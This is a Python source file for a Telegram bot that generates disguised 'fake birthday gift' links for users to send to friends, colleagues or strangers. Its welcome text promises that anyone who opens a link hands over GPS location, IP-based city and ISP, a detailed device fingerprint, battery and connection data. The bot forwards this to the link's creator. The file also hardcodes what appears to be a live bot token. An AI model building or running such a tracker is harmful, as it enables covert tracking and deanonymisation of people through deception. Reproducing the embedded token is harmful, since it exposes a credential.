#!/usr/bin/env python3
import requests
import json
import time
import uuid
import os
from datetime import datetime, timedelta
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler

# ================= CONFIG =================
BOT_TOKEN = "8858548041:AAH5-uEvtsWNMsCpeEKsvOseVnLM-tAHaNs"
ADMIN_ID = 6323367629
BASE_URL = "https://birthday-gift-by-patel.vercel.app"
LINK_EXPIRY_MINUTES = 30
# =========================================

TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
OFFSET = 0

# Data storage
user_data = {}
created_links = {}
waiting_for_input = {}

# ============ SEND MESSAGE ============
def send_msg(chat_id, text, reply_markup=None, parse_mode="HTML"):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "disable_web_page_preview": True
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    
    try:
        resp = requests.post(url, json=payload, timeout=30)
        return resp
    except Exception as e:
        print(f"Send error: {e}")
        return None

# ============ KEYBOARDS ============
def user_keyboard():
    return {
        "keyboard": [
            ["🎁 CREATE TRACKING LINK"],
            ["📊 MY LINKS", "📋 STATS"]
        ],
        "resize_keyboard": True
    }

def cancel_keyboard():
    return {"keyboard": [["❌ CANCEL"]], "resize_keyboard": True}

def back_keyboard():
    return {"keyboard": [["🔙 BACK TO MENU"]], "resize_keyboard": True}

# ============ DATA MANAGEMENT ============
def save_user(user_id, name, username):
    uid = str(user_id)
    if uid not in user_data:
        user_data[uid] = {
            "id": user_id,
            "name": name,
            "username": username,
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "links_created": 0,
            "total_visits": 0
        }
        save_data()
        return True
    return False

def add_link(user_id, link_id, name):
    uid = str(user_id)
    if uid not in created_links:
        created_links[uid] = {}
    
    created_links[uid][link_id] = {
        "name": name,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "expires": (datetime.now() + timedelta(minutes=LINK_EXPIRY_MINUTES)).strftime("%Y-%m-%d %H:%M:%S"),
        "visits": 0,
        "last_visit": None
    }
    
    if uid in user_data:
        user_data[uid]["links_created"] = user_data[uid].get("links_created", 0) + 1
    
    save_data()
    return True

def update_visit(link_id):
    for uid, links in created_links.items():
        if link_id in links:
            links[link_id]["visits"] += 1
            links[link_id]["last_visit"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            if uid in user_data:
                user_data[uid]["total_visits"] = user_data[uid].get("total_visits", 0) + 1
            save_data()
            return True
    return False

def save_data():
    try:
        with open("user_data.json", "w") as f:
            json.dump(user_data, f, indent=2)
        with open("links.json", "w") as f:
            json.dump(created_links, f, indent=2)
    except Exception as e:
        print(f"Save error: {e}")

def load_data():
    global user_data, created_links
    try:
        with open("user_data.json", "r") as f:
            user_data = json.load(f)
        print(f"✅ Loaded {len(user_data)} users")
    except:
        user_data = {}
    try:
        with open("links.json", "r") as f:
            created_links = json.load(f)
        total_links = sum(len(links) for links in created_links.values())
        print(f"✅ Loaded {total_links} links")
    except:
        created_links = {}

# ============ HEALTH SERVER (for keeping bot alive) ============
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running!")
    def log_message(self, *args): pass

def run_health_server():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(('0.0.0.0', port), HealthHandler).serve_forever()

# ============ USER FUNCTIONS ============
def handle_user_start(chat_id, user_id, name, username):
    save_user(user_id, name, username)
    
    msg = f"""🎁 <b>BIRTHDAY SURPRISE TRACKER</b> 🎁

<b>What this bot does:</b>
Create a fake birthday gift link and share it with anyone.
When they open it, you will receive:

📍 <b>GPS Location</b> (if allowed)
🌐 <b>IP Address with City/State/Country/ISP</b>
📱 <b>Complete Device Info</b> (OS, Screen, GPU, RAM, Fonts)
🔋 <b>Battery Status</b>
📡 <b>Connection Speed</b>

⏰ <b>Link expires in {LINK_EXPIRY_MINUTES} minutes!</b>

👇 Click <b>CREATE TRACKING LINK</b> to start!"""
    
    send_msg(chat_id, msg, user_keyboard())

def handle_create_link(chat_id):
    msg = f"🎁 <b>Create Your Tracking Link</b>\n\nSend a name for this link (e.g., Friend, Raj, Cousin, Boss):\n\n⏰ This link will expire in {LINK_EXPIRY_MINUTES} minutes."
    send_msg(chat_id, msg, cancel_keyboard())
    waiting_for_input[chat_id] = "create_link"

def create_link(chat_id, user_id, name):
    link_id = str(uuid.uuid4())[:8]
    add_link(user_id, link_id, name)
    
    # Generate link with user_id
    link = f"{BASE_URL}/?id={link_id}&name={name.replace(' ', '%20')}&user_id={user_id}"
    
    expires_time = (datetime.now() + timedelta(minutes=LINK_EXPIRY_MINUTES)).strftime("%Y-%m-%d %H:%M:%S")
    
    msg = f"""✅ <b>Link Created Successfully!</b>

🎁 <b>Name:</b> {name}
⏰ <b>Expires:</b> {expires_time}
🔗 <b>Your Link:</b> <code>{link}</code>

<b>How to use:</b>
1. Copy this link
2. Share it as a "Birthday Gift" on WhatsApp, Telegram, Instagram, or SMS
3. When someone opens it, you'll get their data here!

⚠️ <b>Note:</b> The link will stop working after {LINK_EXPIRY_MINUTES} minutes."""
    
    send_msg(chat_id, msg, user_keyboard())
    print(f"✅ Link created: {link_id} for user {user_id}")

def handle_my_links(chat_id, user_id):
    uid = str(user_id)
    links = created_links.get(uid, {})
    
    if not links:
        msg = "📭 <b>No links created yet!</b>\n\nUse the 'CREATE TRACKING LINK' button to make your first link."
        send_msg(chat_id, msg, user_keyboard())
        return
    
    msg = "🎁 <b>YOUR TRACKING LINKS</b>\n\n"
    for link_id, data in links.items():
        expires = datetime.strptime(data['expires'], "%Y-%m-%d %H:%M:%S")
        expired = datetime.now() > expires
        status = "🔴 EXPIRED" if expired else "🟢 ACTIVE"
        
        msg += f"┌ <b>{data['name']}</b> [{status}]\n"
        msg += f"├ 👁️ Opens: {data['visits']}\n"
        msg += f"├ 📅 Created: {data['created'][:16]}\n"
        msg += f"├ ⏰ Expires: {data['expires'][:16]}\n"
        if not expired:
            msg += f"└ 🔗 <code>{BASE_URL}/?id={link_id}&name={data['name'].replace(' ', '%20')}&user_id={user_id}</code>\n"
        msg += "\n"
    
    send_msg(chat_id, msg, back_keyboard())

def handle_stats(chat_id, user_id):
    uid = str(user_id)
    links = created_links.get(uid, {})
    
    total_links = len(links)
    total_visits = sum(data.get('visits', 0) for data in links.values())
    active_links = sum(1 for data in links.values() if datetime.now() < datetime.strptime(data['expires'], "%Y-%m-%d %H:%M:%S"))
    
    msg = f"""📊 <b>YOUR STATISTICS</b>

🎁 Total Links Created: {total_links}
🟢 Active Links: {active_links}
👁️ Total Visits: {total_visits}
⏰ Link Validity: {LINK_EXPIRY_MINUTES} minutes

💡 <b>Tip:</b> Share more links to get more data!"""
    
    send_msg(chat_id, msg, back_keyboard())

def handle_back(chat_id):
    send_msg(chat_id, "🏠 <b>Main Menu</b>\n\nWhat would you like to do?", user_keyboard())

# ============ UPDATE HANDLER ============
def handle_update(update):
    global OFFSET
    
    if "message" not in update:
        return
    
    msg = update["message"]
    chat_id = msg.get("chat", {}).get("id", 0)
    text = msg.get("text", "")
    user_id = msg.get("from", {}).get("id", 0)
    name = msg.get("from", {}).get("first_name", "User")
    username = msg.get("from", {}).get("username", "")
    
    print(f"📨 {name} (@{username}): {text[:50]}")
    
    # Check waiting for input
    if chat_id in waiting_for_input:
        if text == "❌ CANCEL" or text == "/cancel":
            del waiting_for_input[chat_id]
            send_msg(chat_id, "❌ Cancelled!", user_keyboard())
            return
        
        if waiting_for_input[chat_id] == "create_link":
            del waiting_for_input[chat_id]
            if text and len(text) < 50:
                create_link(chat_id, user_id, text)
            else:
                send_msg(chat_id, "❌ Invalid name! Please use less than 50 characters.", user_keyboard())
        return
    
    # Commands
    if text == "/start":
        handle_user_start(chat_id, user_id, name, username)
    
    elif text == "/mylinks":
        handle_my_links(chat_id, user_id)
    
    elif text == "/stats":
        handle_stats(chat_id, user_id)
    
    elif text == "🎁 CREATE TRACKING LINK":
        handle_create_link(chat_id)
    
    elif text == "📊 MY LINKS":
        handle_my_links(chat_id, user_id)
    
    elif text == "📋 STATS":
        handle_stats(chat_id, user_id)
    
    elif text == "🔙 BACK TO MENU":
        handle_back(chat_id)
    
    else:
        send_msg(chat_id, "❌ Unknown command!\n\nPlease use the buttons below 👇", user_keyboard())

# ============ MAIN ============
def main():
    # Load existing data
    load_data()
    
    # Start health server (for keeping bot alive on platforms like Render)
    try:
        health_thread = Thread(target=run_health_server, daemon=True)
        health_thread.start()
    except:
        pass
    
    # Clear webhook
    try:
        requests.get(f"{TELEGRAM_API}/deleteWebhook")
        print("✅ Webhook cleared")
    except:
        pass
    
    # Test bot connection
    try:
        resp = requests.get(f"{TELEGRAM_API}/getMe", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get("ok"):
                bot_info = data.get("result", {})
                print(f"✅ Bot connected: @{bot_info.get('username', 'unknown')}")
            else:
                print(f"❌ Invalid bot token!")
                return
    except Exception as e:
        print(f"❌ Connection failed: {e}")
        return
    
    print("=" * 55)
    print("🎁 BIRTHDAY SURPRISE TRACKER BOT")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"⏰ Link Expiry: {LINK_EXPIRY_MINUTES} minutes")
    print(f"🌐 Base URL: {BASE_URL}")
    print("=" * 55)
    print("✅ Bot is running! Waiting for messages...\n")
    
    global OFFSET
    while True:
        try:
            resp = requests.get(f"{TELEGRAM_API}/getUpdates", 
                               params={"offset": OFFSET, "timeout": 30}, 
                               timeout=35)
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("ok"):
                    updates = data.get("result", [])
                    if updates:
                        print(f"📥 Received {len(updates)} updates")
                    
                    for update in updates:
                        handle_update(update)
                        OFFSET = update.get("update_id", OFFSET) + 1
            else:
                print(f"⚠️ HTTP error: {resp.status_code}")
            
            time.sleep(1)
            
        except KeyboardInterrupt:
            print("\n\n👋 Bot stopped by user!")
            break
        except Exception as e:
            print(f"❌ Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
